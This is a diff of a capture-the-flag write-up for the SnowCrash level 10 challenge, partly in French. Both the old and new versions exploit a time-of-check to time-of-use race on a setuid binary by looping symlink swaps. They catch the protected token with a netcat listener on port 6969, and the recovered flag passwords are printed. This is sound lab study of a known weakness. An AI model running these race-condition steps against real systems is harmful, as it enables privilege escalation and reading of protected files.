@@ -1,46 +1,79 @@
 # LEVEL 10
 
-## 💡 Explanation
-
-In this level we have to:
-1. Check the permissions of ./level10 and token
-2. Execute `./level10`to check what it does => It ask for a file and a file and a host; when providing the file token it complains because we don't have rights, it works when providing another file.
-3. To be able to send the file to a host, we'll have to have a host listening => we can just listen on the port 6969 on the same machine and wait for it to receive the file.
-4.  Now we have to find out how to send the file token... We check how the binary works by using strace and testing with different files => We can see that it first check the rights of the files using the function `access()` and then it `open()` the file which can lead to a security issue.
-5. We have to exploit this security hole by creating a symbolic link from one file to another, so when access checks the permissions it won't have any problem (since it will be pointing to another file) and then it will open the corret one.
-6. Once you get the flag, `su flag10` and `getflag`!
-
-HARDEST LEVEL SO FAR!! 🔥🔥
-
-## 👾 Commands
-
-To find the solution:
+- On check ce qu'il y a: `ls -la`
 ```
-./level10
-./level10 token lol
-ln -s /home/user/level10/token /tmp/lol; ./level10 /tmp/lol lol
-rm /tmp/lol; echo "lol" > /tmp/lol; ./level10 /tmp/lol lol
-nc 6969 -l => Run it every time we launch level10 (on a different terminal)
-rm /tmp/lol; echo "lol" > /tmp/lol; strace ./level10 /tmp/lol 127.0.0.1
+total 16
+-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
+-rw-------  1 flag10 flag10     26 Mar  5  2016 token
 ```
 
-To exploit the security hole:
-- Running in the background     : `echo "lal" > /tmp/lal; (while true; do ln -fs /tmp/lal /tmp/lol && ln -fs /home/user/level10/token /tmp/lol; done)&`
-- Running in a terminal         : `while true ; do nc -l 6969; done`
-- Running in another terminal   : `for i in `seq 50`; do ./level10 /tmp/lol 127.0.0.1; done`
-- Run it several times if needed! Do not forget to kill the process once you get the flag `kill -9 <pid>`!
+- `ltrace ./level10` : \
+```
+__libc_start_main(0x80486d4, 1, 0xbffff6e4, 0x8048970, 0x80489e0 <unfinished ...>
+printf("%s file host\n\tsends file to ho"..., "./level10"./level10 file host
+	sends file to host if you have access to it
+) = 65
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+```
 
-## 🔍 Resources
+Meme soucis que l'exo precedent, can't ltrace
 
-- [How to open a TCP listener?](https://unix.stackexchange.com/questions/214471/how-to-create-a-tcp-listener)
-- [Linux access command](https://man7.org/linux/man-pages/man2/access.2.html)
-- [Linux open command](https://linux.die.net/man/3/open)
-- [Time-of-check to time-of-use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)
-- [How to exploit the access security hole? I](https://stackoverflow.com/questions/14333112/access2-system-call-security-issue)
-- [How to exploit the access security hole? II](https://stackoverflow.com/questions/11525164/what-is-wrong-with-access)
-- [How to exploit the access security hole? III](https://stackoverflow.com/questions/7925177/access-security-hole)
-- [Linux ln command](https://man7.org/linux/man-pages/man1/ln.1.html)
-- [How to kill a process?](https://itsfoss.com/how-to-find-the-process-id-of-a-program-and-kill-it-quick-tip/)
+- `./level10 token` :
+```
+./level10 file host
+	sends file to host if you have access to it
+```
+- On essaye de lancer la commande avec le usage indique:
+- `ltrace ./level10 /var/crash/test 0.0.0.0`
+```
+__libc_start_main(0x80486d4, 3, 0xbffff6d4, 0x8048970, 0x80489e0 <unfinished ...>
+access("/var/crash/test", 4)                              = 0
+printf("Connecting to %s:6969 .. ", "0.0.0.0")            = 30
+fflush(0xb7fd1a20Connecting to 0.0.0.0:6969 .. )                                        = 0
+socket(2, 1, 0)                                           = 3
+inet_addr("0.0.0.0")                                      = NULL
+htons(6969, 1, 0, 0, 0)                                   = 14619
+connect(3, 0xbffff61c, 16, 0, 0)                          = 0
+write(3, ".*( )*.\n", 8)                                  = 8
+printf("Connected!\nSending file .. "Connected!
+)                    = 27
+fflush(0xb7fd1a20Sending file .. )                                        = 0
+open("/var/crash/test", 0, 010)                           = 4
+read(4, "yooooo\n", 4096)                                 = 7
+write(3, "yooooo\n", 7)                                   = 7
+puts("wrote file!"wrote file!
+)                                       = 12
++++ exited (status 12) +++
+```
+On voit qu'au tout debut, le programme check les acces au fichier qu'on lui donne, si c'est ok, il fait pleins de trucs, puis il imprime le contenu du fichier.
+On se dit que si entre le moment ou il check les permission et le moment ou il print le contenu, ya moyen de bidouiller quelque chose: \
+On voudrait qu'il check les permissions d'un fichier auquel on a acces, mais qu'il affiche le contenu du token surlequel nous n'avons pas les droits... \
+On va exploiter cette `race condition` avec deux boucles while:
+
+```bash
+while ((1))
+> do
+    > touch /var/crash/tmp
+    > rm /var/crash/tmp
+    > ln -s /home/user/level10/token /var/crash/tmp
+    > rm /var/crash/tmp
+> done
+```
+
+```bash
+while ((1))
+do ./level10 /var/crash/tmp 0.0.0.0
+done
+```
+
+- WE GET `woupa2yuojeeaaed06riuj63c`
+```bash
+level10@SnowCrash:~$ su flag10
+Password:
+flag10@SnowCrash:~$ getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+```
 
 ## 🔥 Password
 `woupa2yuojeeaaed06riuj63c`
